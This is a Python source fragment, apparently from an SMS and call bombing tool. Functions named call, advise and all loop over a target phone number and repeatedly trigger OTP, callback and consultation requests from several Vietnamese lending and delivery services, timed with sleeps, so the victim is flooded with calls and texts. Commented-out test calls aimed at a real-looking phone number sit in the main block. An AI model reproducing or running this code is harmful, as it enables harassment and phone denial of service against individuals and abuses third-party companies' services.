  threading.submit(api_sms.Mocha,phone)

def call(phone,stt_while):
  for i in range(stt_while):
    threading.submit(api_call.robocash,phone)
    time.sleep(30)
    threading.submit(api_call.dongplus,phone)
    time.sleep(30)
    threading.submit(api_call.senmo,phone)
    time.sleep(30)
    threading.submit(api_call.thantaioi,phone)
    time.sleep(30)
    threading.submit(api_call.oncredit,phone)
    time.sleep(30)

def advise(phone):
  threading.submit(api_advise.giaohangtietkiem,phone)
  threading.submit(api_advise.ldpform,phone)
def all(phone,stt_while):
  for i in range(stt_while):
    now_sms(phone)
    threading.submit(api_call.robocash,phone)
    time.sleep(15)
    threading.submit(api_call.dongplus,phone)
    time.sleep(15)
    now_sms(phone)
    threading.submit(api_call.senmo,phone)
    time.sleep(15)
    threading.submit(api_call.thantaioi,phone)
    time.sleep(15)
    now_sms(phone)
    threading.submit(api_call.oncredit,phone)
    time.sleep(15)
    advise(phone)
def test(phone,stt_while):
  print(phone)
  time.sleep(10)
  print(stt_while)
  
  
if __name__ == '__main__':
  #api_call.senmo("0334304657")
  #api_sms.vuihoc("0334304657")
  print("Tất Cả Func Api Điều Hoạt Động")